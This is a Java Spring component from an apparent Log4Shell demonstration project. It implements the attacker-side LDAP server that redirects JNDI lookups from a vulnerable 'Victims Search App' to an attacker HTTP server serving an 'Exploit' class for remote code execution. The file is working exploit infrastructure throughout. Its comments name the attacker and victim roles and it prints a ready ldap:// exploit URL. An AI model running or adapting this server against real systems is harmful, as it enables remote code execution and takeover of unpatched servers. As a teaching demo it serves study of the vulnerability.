package com.demo.exploit.log4jshell.attacker.server.ldap;

import com.demo.exploit.log4jshell.attacker.configurations.Constants;
import com.demo.exploit.log4jshell.attacker.server.http.AttackerHttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;


/**
 * This is a LDAP server, which an attacker has hosted.
 * Attacker will pass this LDAP server URL in the Web Application.
 * In this case the Web Application is the Victims Search App.
 *
 * @author karanratra on 12/20/21
 */

@Component
public class AttackerLDAPServer {

    @PostConstruct
    public void init() {
        try {
            //Get the available port to start the HTTP Server.
            int availablePort = AttackerHttpServer.getAvailablePort(Constants.LOCAL_WEB_SERVER_HOST);

            //Here attacked is initializing the HTTP server, where all the redirect requests from the LDAP server will be honored
            AttackerHttpServer.startHttpServer(Constants.LOCAL_WEB_SERVER_HOST, availablePort);

            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(Constants.LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName(Constants.LDAP_SERVER_HOST),
                    Constants.LDAP_SERVER_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            //Attach a interceptor to LDAP server, this Interceptor will forward the incoming requests to HTTP Server
            config.addInMemoryOperationInterceptor(new AttackerLDAPOperationInterceptor(new URL("http://" + Constants.LOCAL_WEB_SERVER_HOST + ":" + availablePort + "/#Exploit")));

            InMemoryDirectoryServer ldapServer = new InMemoryDirectoryServer(config);
            ldapServer.startListening();

            System.out.println(String.format("[*] LDAP server listening on 0.0.0.0:%d (ldap://%s:%d/Exploit)", Constants.LDAP_SERVER_PORT,  Constants.LOCAL_WEB_SERVER_HOST, Constants.LOCAL_WEB_SERVER_PORT));
        } catch (Exception e) {
            System.out.println("[!] Start LDAP Server fail!");
            e.printStackTrace();
        }
    }
}
